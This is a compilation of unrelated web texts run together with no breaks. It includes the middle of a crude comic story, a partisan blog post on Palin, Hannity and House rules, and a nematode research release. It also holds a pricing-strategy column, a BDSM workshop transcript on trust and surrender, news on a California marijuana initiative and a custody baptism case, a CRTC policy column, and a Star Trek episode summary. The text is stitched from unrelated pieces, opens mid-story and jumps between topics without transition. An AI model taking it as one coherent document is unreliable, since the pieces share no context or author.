" They installed so many saliva glands in me that food simply slips right out of my mouth !
It 's hell !
Hell has come to town , and he 's asking around about apartments !
Hell wants to be your roommate , and he 's going to drink straight out of thegoddamn carton ! "
" Jesus !
I 'm sorry , I ... I did n't know .
I must have slipped through time somehow .
This was all just here when I woke up .
I had no idea ! " " No ... " a look of disbelief passed over his face , quickly replaced by a kind of skeptical hope , " can it be ?
You 're ... pure ?
Unaltered ?
Two eyes , two ears , one heart ? "
" Yeah , I ... " he patted me down frantically , feeling all of my limbs , " ... I 've got a dick that does the work of 10 lesser dongs , but that 's about it . "
At that he suddenly choked off a sob -- you could tell the words ' dick ' and ' work ' appearing together in the same sentence pained him .
I slapped his shoulder reassuringly .
" Listen , man , I was exaggerating .
Honestly , it only does the work of two , maybe three cocks , tops . "
Still the hardest working dick in show business , though .
" No matter ! " he cried , seizing my arm and rushing headlong down the path with a frenzied abandon .
" We must bring you to the elder !
You are pure !
The prophecy is true ! "
After what seemed like an eternity of random , stumbling turns through a series of increasingly narrow tunnels , we finally emerged into a large , dimly lit cavern beneath the rock .
Its outer boundaries were lost in shadow , and the entire floor of it was crowded with strange dwellings that seemed to be modeled after an idyllic ' 50s suburb .
Ratty , musty carpeting was laid down in place of the archetypal finely manicured lawn ; pointed sticks rubbed with chalk took the place of white picket fences ; roughshod collections of garbage shaped like old Buicks , lawnmowers and ice cream trucks were haphazardly strewn throughout .
As we passed by each " home , " the inhabitants shyly stepped out from the doorways in their burnt and blackened suits ; their housedresses cobbled together from scraps of plastic .
It was heartrending .
They were clinging to the past with everything they had , though the world had long since left them behind .
" Where are we going ? " I asked Beck .
" To the elder !
We have waited for this day for so long ! "
He dragged me up a twisting ramp onto a raised dais in the middle of the cavern .
The people congregated below , a hushed murmur of excitement stirring amongst them .
An ostentatious , adorned throne was erected in the center of the platform , and I could just make out the shadowy form of a man there .
He stood and with great effort waddled his way into the light , where I could see that he alone was wearing an unmarked , impeccably - tailored Italian suit .
His hair was obviously recently and expensively cut .
His hands were soft and clean .
A gold watch shone from his wrist .
Moscow Meets Fleet Street Can a Russian Oligarch Save the British Press ?
Alexander Lebedev sees himself as the savior of Britain 's struggling newspaper industry .
He already owns the Evening Standard and is in talks to buy The Independent .
But some suspect the Russian oligarch has ulterior motives .
Sean Hannity interviewed Sarah Palin on his show last night , and it sounded like she was talking in a tin can , despite the pretty Alaskan backdrop .
It sounded , in fact , like one of Sarah 's old performances as an Alaska sports reporter ; evidently a professional studio was not available .
But who cares about such niceties when you 're busy accusing Democrats of violating the Constitution ?
Considering that the charge is not just loony but grotesquely hypocritical , standing on a soap box on a street corner might have been the most appropriate setting ; a tin-can studio is a step up .
Palin claimed that the health - care reform effort was " about government control , " and that the process in the House for passing it is " an unconstitutional process " being " crammed down our throats " :
Palin :
It 's against the will of the people , it 's undemocratic , it 's un-American , this process .
And , uh , if we do n't stand up and become very enthused about calling our politicians on this , then more of this is gonna take place .
Later , Palin asks : " Is the Constitution not worth the paper it is written on , then ? "
Hannity natters on in agreement , claiming that the " Slaughter rule " would be challenged in court by his buddy Mark Levin .
Palin then added :
I think , Sean , that in our lifetime , this is the most undemocratic , unAmerican step that we 'll have ever seen our Congress take .
It 's appalling , it 's -- it takes my breath away that they would think that this is OK to do .
But again , we can't feign surprise .
Remember , this is what Barack Obama had promised in the campaign , he said as a candidate that he was just days away from beginning the transformation of America .
Now , a lot of us love America , and we do n't want to see this transformation into something that is unrecognizable , this European style of health care , in this case that we 're talking about .
But no , so many of us that love America and believe in what our Founding Fathers providentially had crafted for us , you know , our documents including our Constitution -- we do n't agree with this fundamental transformation of America that Obama promised us .
We voted for him anyway , he was elected anyway .
And now Americans are kind of realizing that 's what he meant by a fundamental transformation of our great country .
Yes , it 's too bad for Palin and Hannity that a large majority of Americans greeted Obama 's promise of a " transformation " .
That 's what elections are about , you know .
And the notion that this transformation entails abrogation of the Constitution is just laughable -- because the procedures they 're wailing and gnashing their teeth about have been part of standard House procedures for years .
You sure did n't hear Palin or Hannity complaining when Republicans used these same rules willy - nilly during their tenure of complete control of Congress earlier this decade .
Indeed , Republicans " set new records " in their use of the so - called self - executing rules that are now in play for health - care reform :
When Republicans took power in 1995 , they soon lost their aversion to self - executing rules and proceeded to set new records under Speaker Newt Gingrich ( R - Ga . ) .
There were 38 and 52 self - executing rules in the 104th and 105th Congresses ( 1995 - 1998 ) , making up 25 percent and 35 percent of all rules , respectively .
Under Speaker Dennis Hastert ( R - Ill . ) there were 40 , 42 and 30 self - executing rules in the 106th , 107th and 108th Congresses ( 22 percent , 37 percent and 22 percent , respectively ) .
Thus far in the 109th Congress , self - executing rules make up about 16 percent of all rules .
On April 26 [ 2006 ] , the Rules Committee served up the mother of all self - executing rules for the lobby / ethics reform bill .
The committee hit the trifecta with not one , not two , but three self - executing provisions in the same special rule .
These rules are long established procedural rules .
A 2006 House report observed :
Self - executing rules are still employed on matters involving House - Senate relations .
They have also been used in recent years to enact significant substantive and sometimes controversial propositions .
Among these :
On February 20 , 2005 , the House adopted H. Res. 75 , which provided that a manager ’s amendment dealing with immigration issues shall be considered as adopted in the House and in the Committee of the Whole and the bill ( H.R. 418 ) , as amended , shall be considered as the original bill for purposes of amendment .
Meanwhile , none of these people -- and particularly neither Hannity nor Palin -- objected when George W. Bush wiped his butt with the Constitution by wiretapping American citizens and instituting " enemy combatant " procedures for captured terrorists .
Because , you know , it 's always OK if you 're a Republican .
Researchers at the Energy Biosciences Institute ( EBI ) at the University of Illinois have discovered widespread occurrence of plant - parasitic nematodes in the first reported nematode survey of Miscanthus and switchgrass plants used for biofuels .
Lead researcher Tesfamariam Mekete , a U of I post - doctoral research associate , said the team 's first step was to identify potential pathogenic nematodes of these top two energy - yielding cellulosic - ethanol feedstock plants .
" Nematodes are a part of our soil systems , " Mekete said .
" However , when it comes to potential crops for biofuel production , we simply do n't know which nematodes are present in these crops and at what levels . "
The 2008 - 09 nematode survey included samples from 37 Miscanthus and 48 switchgrass plots in Illinois , Georgia , Iowa , Kentucky , South Dakota and Tennessee .
All sample sites had at least two nematode species that have been reported to reduce biomass in most monocotyledon hosts .
The damaging population thresholds for these nematodes to Miscanthus and switchgrass are still unknown .
However , the population densities encountered may present a potential risk to biofuels production when compared with threshold densities reported on other monocotyledon hosts , Mekete said .
Researchers discovered lesion ( Pratylenchus ) , dagger ( Xiphinema ) , needle ( Longidorus ) , lance ( Hoplolaimus ) , stunt ( Tylenchorhynchus ) , spiral ( Helicotylenchus ) , and ring ( Criconema ) in Miscanthus and switchgrass .
These nematodes have previously been reported to cause damage to several plant species such as corn , bent grass , switchgrass and turf grasses .
" The high levels of nematodes found in our survey and the damage symptoms observed in infected roots suggest parasitism may contribute to the decline of biomass production , " Mekete said .
Needle nematodes , discovered at high levels in the sandy soils of Havana , Ill. , and Georgia , caused visible stunting of lateral roots and destruction of the fibrous root system .
Mekete 's team hopes to do further research in Havana to study the interaction between this nematode and biomass yield .
Researchers are now studying damage thresholds of lesion , root - knot and needle nematodes to Miscanthus and switchgrass under greenhouse conditions .
Future studies will include host suitability and population dynamics of the most prevalent nematodes associated with these perennial grasses .
In addition to discovering information on the distribution , presence , abundance and identification of these nematodes , researchers also developed species - specific DNA tests to help identify nematodes so future research can focus on developing control tactics .
" Diseases and pests have the potential to cause significant constraints on biomass production , putting the crops at risk for reductions in biomass yield and quality , " Mekete said .
" Of the many pests and diseases , plant - parasitic nematodes are of great economic importance because they can directly influence plant biomass and predispose plants to attack by other soil - borne pathogens . "
Portions of this research have been published in GCB Bioenergy .
The research was funded by EBI .
The research team included Tesfamariam Mekete , Kimberly Reynolds , Horacio Lopez - Nicora , Michael Gray and Terry Niblack of the U of I .
Apple ’s launch of the iPad next week is a gamble in more ways than one .
To start with , it ’s obviously a bet that there are millions of people looking for a new way to surf the Web , watch movies , and read magazines .
But it ’s also a more fundamental gamble ; namely , that people will pay for quality .
Starting at five hundred dollars , the iPad is significantly more expensive than its competitors .
But Apple ’s assumption is that , if the iPad is also significantly better , people will happily shell out for it ( as they already do for iPods , iPhones , and Macs ) .
That ’s why when Steve Jobs first introduced the iPad he said that , if a product was n’t “ far better ” than what was already out there , it had “ no reason for being . ”
Illustration by Christoph Niemann
For Apple , which has enjoyed enormous success in recent years , “ build it and they will pay ” is business as usual .
But it ’s not a universal business truth .
On the contrary , companies like Ikea , H. & M. , and the makers of the Flip video camera are flourishing not by selling products or services that are “ far better ” than anyone else ’s but by selling things that are n’t bad and cost a lot less .
These products are much better than the cheap stuff you used to buy at Woolworth , and they tend to be appealingly styled , but , unlike Apple , the companies are n’t trying to build the best mousetrap out there .
Instead , they ’re engaged in what Wired recently christened the “ good - enough revolution . ”
For them , the key to success is n’t excellence .
It ’s well - priced adequacy .
These two strategies may look completely different , but they have one crucial thing in common : they do n’t target the amorphous blob of consumers who make up the middle of the market .
Paradoxically , ignoring these people has turned out to be a great way of getting lots of customers , because , in many businesses , high - and low - end producers are taking more and more of the market .
In fashion , both H. & M. and Hermès have prospered during the recession .
In the auto industry , luxury - car sales , though initially hurt by the downturn , are reemerging as one of the most profitable segments of the market , even as small cars like the Ford Focus are luring consumers into showrooms .
And , in the computer business , the Taiwanese company Acer has become a dominant player by making cheap , reasonably good laptops — the reverse of Apple ’s premium - price approach .
While the high and low ends are thriving , the middle of the market is in trouble .
Previously , successful companies tended to gravitate toward what historians of retail have called the Big Middle , because that ’s where most of the customers were .
These days , the Big Middle is looking more like “ the mushy middle ” ( in the formulation of the consultants Al and Laura Ries ) .
The companies there — Sony , Dell , General Motors , and the like — find themselves squeezed from both sides ( just as , in a way , middle - class workers do in a time of growing income inequality ) .
The products made by midrange companies are neither exceptional enough to justify premium prices nor cheap enough to win over value - conscious consumers .
Furthermore , the squeeze is getting tighter every day .
Thanks to economies of scale , products that start out mediocre often get better without getting much more expensive — the newest Flip , for instance , shoots in high - def and has four times as much memory as the original — so consumers can trade down without a significant drop in quality .
Conversely , economies of scale also allow makers of high - end products to reduce prices without skimping on quality .
A top - of - the - line iPod now features video and four times as much storage as it did six years ago , but costs a hundred and fifty dollars less .
At the same time , the global market has become so huge that you can occupy a high - end niche and still sell a lot of units .
Apple has just 2.2 per cent of the world cell - phone market , but that means it sold twenty - five million iPhones last year .
The boom in information for consumers has also severely weakened middle - market firms .
In the past , these companies were able to charge a premium price because their brands were taken as signals of reasonable quality and reliability .
Today , consumers do n’t need to rely on shorthand : they have Consumer Reports and J. D. Power , CNET and Amazon ’s user ratings , and so on , which have made it easier to gauge differences in quality accurately .
The result is that brands matter less : a recent Nielsen survey found that more than sixty per cent of consumers think that stores ’ generic products are equal in quality to brand - name ones .
In effect , the more information people have , the tighter the relationship between quality and price : if you can deliver a product or service that is qualitatively better , you can charge top dollar .
But if you ca n’t deliver the quality you ca n’t get the price .
( Even Apple , after all , could n’t make Apple TV a hit . )
This does n’t mean that companies are going to abandon the idea of being all things to all people .
If you ’re already in the middle of the market , it ’s hard to shift focus — as G.M. has discovered .
And the allure of a big market share is often hard to resist , even if it does n’t translate into profits .
According to one estimate , Nokia has nearly twenty times Apple ’s market share , but the iPhone alone makes almost as much money as all Nokia ’s phones combined .
But making money by selling moderately good products that are moderately expensive is n’t going to get any easier , which suggests a slight rewrite of the old Highland ballad .
You take the high road , and I ’ll take the low road , and we ’ll both be in Scotland afore the guy in the middle . ♦

Trust , safety and surrender are a triad that , in combination , can unlock the doors to deep submission and connectedness between D/s partners .
Creating that environment takes some work , though .
Here is an online talk I gave on the subject , getting into some detail about how trust , safety and surrender interact , and how to foster them .
This chat is left with some participant 's questions scattered throughout , because I think they brought up some good points .
Names are replaced by initials to maintain anonymity .
* * *
I 'm going to talk tonight about the triad of elements that I think best create a healthy foundation for effective power exchange : Trust , Safety , and Surrender .
D/s is predicated on trust , unlike in vanilla relationships where we are often content to negotiate relationships that hedge on the factor of trust .
You can't do that in D/s and have a relationship that will endure .
Trust is the cornerstone of what enables power exchange to happen ( as I will be elaborating )
There is also a given here , a background assumption in what I 'm going to be saying : namely , that communications skills exist and are being used , and that you and your partner both have a mutual dedication to creating a trusting and safe environment in which to do D/s .
You can not build trust one - sidedly .
It takes two ... just as it does to create safety .
TRUST
First thing I want to say about trust is this .
Trust comes from your self .
No one can make you trust them .
We trust others to the extent that we trust ourselves ... trust ourselves to make good decisions , to read the other person right .
When trust is broken or betrayed , you might feel that it has been so damaged you can never trust again ... this happens when a person no longer feels sie can trust hirself to judge others ' trustworthiness correctly .
That is a difficult place to be in .
It destroys D/s and relationships and hobbles one 's ability to relate to others .
I think there are some ways we can approach trust , though , that make it a more manageable thing .
One big tactic is this : listen to your heart .
Use what I call " the heart monitor " - that twinge , that feeling that something is amiss - ( or a - right ) .
You already come wired with intuition and sensitivies that let you judge the trustworthiness of others , on many levels .
It is vital that we develop the skill to listen to ourselves .
To listen to our intuition - which is perhaps an energy - based thing , or according to some studies is the reading of 1001 subliminal clues about what messages a person is really sending .
However you regard it , it is possible to use your intuition to help create a foundation of trust - i.e. to decide if it is safe to trust someone .
Remember that intuition is not a predictive tool : it is a read in the moment .
It is real - time .
If you read someone as trustworthy and later they betrayed your trust , I would ask you this : did you check back in on your intuitive read frequently ?
Or did you scan them once and file that impression away as " the way they are " ?
If you did the latter , it is easy to miss red flags .
Red flags come up frequently in relationships - that heart twinge thing I mentioned .
It is absolutely vital that you pay attention to this danger signal .
Not the 100th time it happens , but the very first .
It is your Self urging your self to notice something that needs to be addressed .
If you want to maintain trust you need to address the discordant event that caused your heart to twinge like that .
That is where your communication skills come in .
" I have an issue I 'd like to discuss ... " then you sit and talk about it .
This not only keeps your relationship clean , it enables you to kill all the little monsters that otherwise will grow into great large unmanageable monsters that will eat your relationship . < g >
Trust starts with yourself ... but there is also this big question : is the person you want to trust , trustworthy ?
Do they demonstrate that they are worthy of your trust ?
You want to invest trust where it is worthwhile to do so , of course .
There are certain things to look for that help you determine if
someone is worthy of your trust .
One big one is : integrity .
Integrity comes from the word integral .
" Of a whole ; of one piece " .
Is the person someone who is of one piece ?
Are their actions consonant with their words ?
Do they say what they mean and mean what they say ?
When actions match words and intentions are clear , there is integrity in behavior .
Life interferes with all of our plans , at times ; maybe someone says they will call and then they do n't .
Once or twice may be understandable - but if there is a pattern of repetitive behaviors that lack integrity ( or reliability ) ... that is a red flag .
Another point is reliability : can you count on someone ?
Can I count on you to show up for a play party date ?
Can I count on you to play hard with me and help me get put back together when I 'm a snotball crying in the corner , at the end of it all ?
Will you do what you say you will do , when all is said and done , and can I rely on that ?
Reliability is closely related to integrity , as you can see .
Honesty is another biggie .
Is the person truthful with you ?
Do they obfuscate , omit or lie in matters big or small ?
If someone has a difficult time conveying the truth to you there may be many reasons that is so .... but in the end , the result is that you will not know if you can trust their word .
This not only undermines trust , it makes it very hard to place trust and stay trusting of someone who tells you untruths .
I mediated a dispute between a Master and his slave last year .
He was busy insisting he treated his slave with honor , that he was an honorable man .
Her problem , however , was that he lied to her about his sexual partnerships , and he continually broke his word .
When they fell apart he was baffled : he had treated her honorably ( he thought ) .
He never saw that unreliability , lack of integrity , and untruthfulness destroyed the basis of trust the slave needed to be in relationship .
When judging trustworthiness it is important to be aware of those elements .
Try an exercise in empathy and turn the mirror around as well .
Ask yourself : am I behaving in ways that are trustworthy to my partner ?
Try to see your actions through your partners ' eyes .
This is not an ultimate answer ( we all have our filters , of course ) but it can be a useful reality check .
Also ask : is my partner willing to trust ?
Or withholding trust ?
Because that comes from within , you cannot " make " your partner trust you .
They must find their way to that place of trust themselves - aided by your trustworthiness .
Now here 's a Stupid Human Trick I will caution you against < g > : Blind Trust .
Do n't go there .
Subs seem to be wired to be readily vulnerable , and often want to be vulnerable and trusting .
We too often give trust where it is not warranted !
We hastily decide to trust someone we do n't know anything about , or at least have not seen their trustworthiness demonstrated .
Later , when things fall apart we feel our trust was betrayed .
But why was it betrayed ?
Could it be we made a poor choice about whom to trust and how far to trust them ?
It is often so .
I am about to talk about how trust relates to safety , but before I leave this topic I can either take some questions now , or we can leave them til the end .
Preferences ?
R. asks :
So it comes down quite a bit to communication , both with ourselves and our partner ?
Humongous amounts of communications , R . In fact that is a whole ' nother workshop I teach about this stuff .
But it is absolutely essential that you be able to say " I got something going on here " .
T. asks : I 'm kind of curious about your remarks on intuition .
I guess at the very beginning , you almost have to rely almost entirely on intuition - and it 's nothing you can articulate .
So if something " seems funny " at that stage , how can you bring it to the table ?
That 's a good question .
There are a number of techniques for figuring out what feels off to you .
You can do things like .... journaling ; talking to your various inner selves ; sometimes just quiet introspection and asking the right questions ( why did xyz bother me ? " )
Introspection plays a big role in figuring out what 's off .
If you listen to yourself , something will come to the surface .
Often it is something that reminds us of " old stuff " , too .
But it is crucial to identify " what 's wrong with this picture " .
J. says : I have found that talking things over with others really helps me .
That can certainly be a help .
I would note though that some people process maybe too much with others , looking for validation or affirmation .
Ultimately it is your own gut you must trust - must learn to trust .
SAFETY
When we are doing D/s , we want to trust our partner , and we need to feel safe with someone in order to submit and surrender .
In the matter of safety , we end up asking ourselves two key questions :
1. Can I trust you not to harm me ?
If I am open and share my heart , can I trust that you will not belittle me , hurt me , kick my teeth in , in consequence ?
We hope the answer is " yes " , of course .
If so , then you can feel safe with your partner and relax internal defenses in their presence .
The second , closely related question is this :
2. Can I trust you to keep me safe ?
In D/s we are very resonant with the energy of protective authority figure watching out for the well being of the vulnerable submissive figure .
Although it is also true that subs safeguard the emotional well being of their doms as well ( or do in a healthy relationship ) - the " nurture / safe / caretaking / protective " energy is often directed a little more towards the submissive .
In either case , when we ask " can I trust you to keep me safe " ? - I am referring here primarily to emotional safety .
This means , simply , " will you safeguard my emotional well being ? "
This is a proactive stance , more engaged on behalf of the partner than the prior reassurance that no harm will be done .
Once we know we wo n't be hurt , the next step is to know we will be safe .
Physical safety is also included in this , but whether or not we are physically safe is easily judged .
Easy to see if the dom is tying loose knots or flogging unsafely , etc .
Or acting out abusively ( physical abuse , that is ) .
It is a finer line , to judge emotional safety , but a place we must learn to become conscious .
Note also : I am not talking about coddling or catering to subs in order to " make " them feel safe in some kind of artificial environment .
Rather I am talking about respecting and honoring authentic connection with your partner , and caring for their heart , no matter what side of the whip you are on .
There is a great synergy between trust and safety .
One feeds off the other .
First you trust a little and feel a little safe ; when you feel safe , it is easier to trust ; the more you trust , the more you let your walls down and discover ( hopefully ) that it is safe to keep those walls down .
We become tremendously close and interconnected in this way .
The reverse is also true : get hurt , trust less .
Trust can be erroded by diminishing the feeling of safety until there simply is no more of either left .
Important note , here : safety is not equivalent to vulnerability .
It is easy to make someone feel vulnerable , especially if there is aggressive domination happening that strips defenses and flattens walls .
It is easy for a sub to mistake feeling wide open ( vulnerable ) with feeling safe .
Subs are often very invested in being vulnerable to their dominants , and so come pre-wired wanting to feel safe enough to be vulnerable .
It 's easy to confuse the two .
Here is a second Stupid Human Trick I caution against : Blind vulnerability .
Going to that space in faith that one is safe .
Knowing if you are safe or not requires an exercise of judgment .
When things blow up we say , " I thought I could trust you !
I thought I was safe with you ! " - " thought " being the key word here .
At some point we run those emotions through the rational brain filter and come to conclusions about how safe we are ( or are n't )
One aspect of self that plays a role in this in a subpersonality we all have that is called the Protector Persona .
( There are entire schools of psychotherapy built around work with subpersonalities , but for now I just offer this as a useful paradigm for this discussion ) .
Your Protector keeps you safe .
Its the part in your head saying , " Is it wise to do that ? " or " No way I 'm gonna let that happen to me ! "
Our Protector personas are engaged almost constantly .
That element is also closely linked to the internalized parent that we all have - and therein lies a major issue on the road to submission and surrender .
SURRENDER
I want to distinguish first between submission and surrender .
Submission=at some level a rational choice to bow to the will of another .
Surrender is a more ego - disengaged state of " giving it up " .
Surrender enables the sub to go just about anywhere the dom wants to take hir .
It is essential that the Protector persona become disengaged , in order to permit surrender to happen .
A lot of people struggle with their submission for many reasons .
But at the heart of a lot of the struggle is this voice ( Protector ) that insists that on some level it is not safe to surrender .
I 'll be at risk .
I may be hurt .
I fear xyz will happen ....
You simply cannot achieve surrender , when your ego is at cross - purposes with you like that .
Now here is how trust and safety work to effect surrender :
When you trust enough that you can truly feel safe , and a safe atmosphere prevails between dom and sub , then you have cleared the landscape as much as possible to allow the submissive to disengage the Protector persona .
When the Protector stands down , surrender can occur .
Ultimately the act of surrender , of giving it up completely to the dominant , is something only the submissive can do for hirself .
But the path there can be eased and enabled , by establishing the maximum amount of trust and safety .
This enables the sub to get out of hir own way , and " go there " .
That , essentially , is why it is so hugely important to establish trust and nurture safety .
Then compliance and submission become easier and surrender becomes possible in D/s relationships .
S. asks :
The protector persona .. how does one work on getting comfortable in turning it off ?
I mean ... how do I say ..
I know it 's something one has to work on with themselves , but are there steps to help ?
( like when people do relaxation techniques ) for flying or something .
Good question .
There are self - dialog techniques that are useful .
In the end , though , the Protector wo n't shut down as long as there are big issues ( or even small niggles ) that prod you about being unsafe .
So the best way to deal is to face your insecurities and fears squarely , and come to resolution about them .
And yes , this requires some serious self - work .
The pay - off is great , though .
S. says : I would imagine it would be rather freeing .
Very .
There is also a certain amount of the Protector stuff that is old tapes , parent tapes , baseless fears ... it's much easier to shut that stuff down when you see it for what it is .
T. asks : do you really want the Protector to shut down completely ?
what about accidents , etc . ?
We 're talking about a situational disengagement here , Tessa .
I find there are certain basic self - preservation issues that never turn off .
But , for instance , if you 're going to play in a way that pushes all your limits - that might be a very good time to disengage the Protector .
Also , " no Protector " is essentially an ego - less state .
Humans being humans , that does n't generally prevail as a way of life .
LOL .
Mother Teresa and Ghandi perhaps excepted .
T. asks : I can see disengaging the Protector 's scrutiny of the person you 're playing with ... but is the Protector that selective ?
If you 're alert enough to be able to notice if the ceiling is about to collapse , are n't you also keeping an eye out on what your partner is up to ?
I find the Protector is on , or off .
If it is off , you have surrendered your judgment circuits for the time being .
That is the point of ' surrender ' - you are trusting the Other to keep you safe ( which of course you can't do if you doubt on some level that you are safe with the Other ) .
If the ceiling really is going to collapse and it catches your Protector 's eye , you will come out of that space of surrender .
T. says : so your Protector can take a break if you 're willing to let your partner substitute for it , I guess
Exactly .
K. asks :
Is there a reason some people do n't seem to understand that trust has to be built ?
Maybe to make communication easier ?
Poor boundaries .
Not always , but often .
Some people come from a space of , I 'll spill all my guts , now you spill all of yours .
They think that boundary - less behavior is " normal " and expect it from those they interact with .
I also think some people are very intuitive and simply have very good instincts about who to trust and how much .... they are sometimes surprised that others do n't read people as accurately as they do .
K. asks :
Do you think that 's a sign that person might not be " safe " to scene with ?
State election officials announced Wednesday that an initiative to legalize marijuana will be on the November ballot , triggering what will likely be an expensive , divisive and much - watched campaign to decide whether California will again lead the nation in softening drug laws .
Los Angeles County election officials Wednesday turned in their official estimate of the number of valid signatures , putting the statewide figure above the 433,971 needed for the measure to make the ballot .
The county , where one - fifth of the signatures were collected , was the last to report its count , filing just before 5 p.m .
Polls have indicated that a majority of voters in California want marijuana legalized , but the margin is not enough to ensure the initiative will win .
Two years ago , opponents defeated an attempt to relax the state 's drug laws despite being outspent .
" It 's always easier for people to say no than to say yes for an initiative , " said Mark Baldassare , the pollster for the Public Policy Institute of California .
" Generally , all it takes is for people to find one reason to say no . "
The initiative would allow adults 21 or older to possess up to an ounce for personal use .
Possession of an ounce or less has been a misdemeanor with a $ 100 fine since 1975 , when Atty .
Gen. Jerry Brown , who was then governor , signed a law that reduced tough marijuana penalties that had allowed judges to impose 10 - year sentences .
Legalization supporters note that misdemeanor arrests have risen dramatically in California in the last two decades .
The initiative would also allow adults to grow up to 25 square feet of marijuana per residence or parcel .
After Joseph Reyes baptized his 3 - year - old daughter against his Jewish ex-wife 's wishes , a court forbid him from exposing her to Catholicism - but he still took her to church .
Reyes explained on GMA , " Catholicism falls right under the umbrella of Judaism . "
A court is scheduled to rule today on whether or not Reyes violated the temporary restraining order barring him from " exposing his daughter to any other religion than the Jewish religion " for 30 days .
While the restraining order is highly unusual , Reyes obviously knew he was n't supposed to take her to church , even if he was , " taking her to hear the teachings of perhaps the most prominent Jewish rabbi in the history of this great planet of ours . "
If religion , not angering his ex , was really his only goal , then why send her pictures of the girl 's baptism and invite a local TV news crew to cover him taking her to church ?

Divorce Battle : Dad Faces Jail Time For Taking Daughter To Church In Violation Of Court Order [ GMA ]
After months of intense lobbying and marketing that pitted broadcasters ( " Local TV Matters " ) against cable and satellite companies ( " Stop the TV Tax " ) , the Canadian Radio - television and Telecommunications Commission weighed in last week with its much - anticipated broadcasting regulatory policy decision .
What the Broadcasters Really Want read more
Announcements , Events & more from Tyee and select partners Hurrah !
Tyee Reporter Katie Hyslop Celebrates 10 - Year Tyeeversary
She ’s covered education , youth and housing issues for a decade now , and we ’re lucky to have her .
Broadcasters were generally viewed as the short - term winners , since the CRTC opened the door to negotiations on a new fee for local television signals , subject to a court ruling confirming the Commission 's jurisdiction to implement such an approach .
That left some very unhappy -- cable and satellite companies warned of increased costs , while the CBC lamented that it was a " dark day " for public broadcasters after it was excluded from the proposed negotiating process .
Two perspectives were largely missing from the decision , however .
The consumer impact was left to a second report , released the following day , in which the commission admitted that prices would go up , but maintained Canadians would continue to pay based on past experience of steady price increases imposed by cable and satellite companies .
That conclusion prompted a stinging minority report from Commissioner Michel Morin , who argued the CRTC was defending " the interests of the industry to the detriment of consumers who , for their part , remain powerless . "
The second missing perspective was the failure to account for the emergence of the Internet as a significant delivery channel for broadcast content .
Indeed , it seemed appropriate that on the day the CRTC released its decision , a new study was published that found Canadians now spend more time online than watching television .
CRTC needs to log on
While the world is increasingly moving online , the CRTC decision acted as if the Internet scarcely exists .
It mentioned the Internet only once , acknowledging that it is a platform for content distribution .
Moreover , the report did not include any references to streaming , YouTube , podcasts , BitTorrent , or peer - to - peer ( the technology used in 2008 by the CBC to distribute its content ) .
The reality of how consumers access broadcast content was surely worth considering in the context of a broadcast policy that envisions the possibility of blocking U.S. broadcasts of television shows where a Canadian broadcaster has purchased local rights to the program and failed to negotiate a fee with a cable or satellite company .
In other words , if the Canadian broadcaster chooses to negotiate for a new fee but fails to reach a deal , it will have the right to mandate blocking broadcast of programs from both local and foreign sources .
That could result in millions of Canadians regularly encountering blank screens instead of expected programs .
Given the increasing expectation of on - demand program viewing , the policy would harm both broadcasters and broadcast distributors , sending more Canadians away from broadcast television to the Internet where there are no blackout messages and most programs are readily available in both legal and illegal forms .
This may be precisely what the CRTC is counting on , hoping the blackout option is so unpalatable to both parties that it will force them to reach a deal .
Consumers may not be inclined to wait around for this particular fight to be resolved , however .
Forced program scarcity ?
Given that they now spend more time online than watching television , the programs are readily available online , and U.S. over - the - air digital signals are freely accessible to a sizable percentage of the Canadian population , basing a broadcast policy that presumes consumers will continue to pay escalating fees and be willing to settle on forced program scarcity in a world of abundance hardly seems like a recipe for success .

Picard , Worf , and Dr. Crusher are reassigned from the Enterprise to a secret mission .
Meanwhile , the Enterprise is under the command of Captain Edward Jellico , who immediately starts making changes , much to the dismay of the crew .
Contents show ]
Summary
Teaser
The USS Enterprise - D and an Excelsior - class ship run side by side at impulse speed .
Nechayev beams aboard the Enterprise and unceremoniously greets Captain Picard .
In her no -nonsense fashion , she informs Picard in his ready room that she is here to relieve him of command of the Enterprise .
Act One
Nechayev meets with Commander Riker , Lieutenant Commander Data , and Counselor Troi in the observation lounge and briefs them that the Cardassians have mobilized three divisions of ground troops ( having withdrawn the bulk of their forces from the Bajoran sector ) and that their subspace transmissions have increased by 50 % .
The admiral hopes that the Cardassians are not willing to risk an incursion and possibly war over one system .
When Riker asks about Picard , Necheyev tells him that he is to be replaced by Captain Edward Jellico , commanding officer of the Cairo .
Necheyev also says that their chief medical officer , Dr. Crusher and security chief , Lieutenant Worf , are also being reassigned to a mission .
The change of command will occur at 1300 hours .
Since Jellico was instrumental in negotiating the original peace treaty with the Cardassians , Nechayev feels he is uniquely qualified to negotiate with them again .
Once Data and Troi leave the observation lounge , Riker reminds the admiral that Jellico can negotiate with the Cardassians without taking command of the Enterprise .
She tells Riker that she wants someone on the bridge who has significant experience with the Cardassians , and that 's not him .
Picard , Worf , and Crusher are training for their secret mission in the holodeck .
They are running a program in a series of dark caves including exercises such as escaping Cardassians , setting mobile shield emitters , and other surprises they might run into on the mission .
They take turns and try to best each other 's times .
Riker meets Captain Jellico in the transporter room .
Riker is immediately overwhelmed by his new commanding officer .
Admiring the beauty and prestige of the Galaxy - class starship , Jellico surmises that must be why Riker has never accepted his own command .
During the short walk to the turbolift , Jellico lists a series of orders including changing the duty shift rotation from three watches to four by 1400 hours and meeting with the department heads at 1500 hours .
They arrive at the turbolift , and Jellico asks Riker whether he prefers " Will " or " William . "
Riker indicates the former , and Jellico asks where his quarters are .
Before Riker can finish his reply , Jellico states the deck number for that room .
He departs in the turbolift , leaving Riker befuddled .
A ceremony for the Change of Command of the Enterprise is held in Ten Forward .
The two captains are in full dress uniforms while the rest of the crew are in standard uniforms ( except Troi , who wears her grey unitard ) .
Captain Picard reads the transfer orders from Admiral Nechayev and instructs the computer to transfer all command codes to Captain Jellico .
The Enterprise is now Jellico's .
Riker meets up with Lieutenant Commander Geordi La Forge , and the engineer asks Riker how long he thinks this change of command is going to last .
Riker tells him that they usually do not perform this ceremony if it is just going to be a temporary assignment .
Meanwhile , Troi spots the exhausted Dr. Crusher sitting in a corner and goes over to her .
Troi asks her if she is sore .
They exchange glances , and the doctor says that she wishes she could talk about the mission but cannot .
Picard and Jellico discuss very specific issues on the ship 's systems .
Jellico says that he can handle anything that comes his way .
They then discuss the specifics of Picard 's mission in a somewhat coded fashion .
Picard reveals that he wishes he had more current information than the two - year old intelligence reports .
Jellico offers to send a Class - 5 probe later , and Picard happily accepts .
Jellico calls for Riker and passes the order to launch the probe during delta shift .
Riker informs his new commanding officer that the new crew rotation is not yet ready and that the department heads believe it will put too much pressure on their personnel .
Jellico orders the new duty roster to be ready immediately and dismisses his first officer .
